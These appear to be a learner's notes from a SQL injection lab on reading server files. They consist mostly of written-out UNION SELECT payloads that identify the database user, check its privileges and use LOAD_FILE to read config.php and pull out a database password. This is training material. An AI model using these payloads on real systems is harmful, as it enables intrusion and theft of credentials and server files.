# [Reading Files](Reading%20Files.md)
### We see in the above PHP code that '$conn' is not defined, so it must be imported using the PHP include command. Check the imported page to obtain the database password

```sql
-- Find current user  
cn' UNION SELECT 1, user(), 3, 4-- -  
-- Answer : root@localhost  
  
-- Find if user has admin privileges  
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -  
-- Answer : Y (yes)  
  
-- Find all user privileges  
cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -  
-- Answer : it select grantee(name) , privilege_type(what's the type of privileges) , is_grantable (Are you eligible for these privileges or not?  
)  
  
-- Find which directories can be accessed through MySQL  
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```
![](Screenshot%202026-06-19%20at%2012.32.10.png)

```sql
File : config.php  
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
```
![](Screenshot%202026-06-19%20at%2012.32.40.png)